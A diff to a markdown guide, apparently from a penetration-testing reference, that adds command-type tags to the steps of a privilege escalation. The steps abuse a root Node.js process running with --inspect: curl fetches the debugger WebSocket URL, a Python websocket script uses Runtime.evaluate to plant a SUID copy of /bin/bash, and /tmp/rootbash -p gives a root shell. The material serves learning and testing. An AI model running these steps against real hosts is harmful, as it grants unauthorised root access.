@@ -13,10 +13,12 @@ If a Node.js process is running as root with the `--inspect` flag enabled, the V
 ### 1. Get the WebSocket URL
 Request the `/json` endpoint of the inspector to retrieve the `webSocketDebuggerUrl`.
 
+<!-- cmd: linux -->
 ```bash
 curl -s http://127.0.0.1:9229/json
 ```
 Response:
+<!-- cmd: http -->
 ```json
 [{
   "id": "0e8809c7-fc0e-426d-9e16-0e9dff19842a",
@@ -29,6 +31,7 @@ Response:
 ### 2. Execute Code via WebSocket
 Connect to the `webSocketDebuggerUrl` and use the `Runtime.evaluate` method to execute commands, like making a `/bin/bash` copy with SUID permissions.
 
+<!-- cmd: linux -->
 ```bash
 python3 -c "
 import websocket, json
@@ -49,6 +52,7 @@ ws.close()
 ### 3. Obtain Root Shell
 Execute the dropped SUID binary.
 
+<!-- cmd: linux -->
 ```bash
 /tmp/rootbash -p
 ```
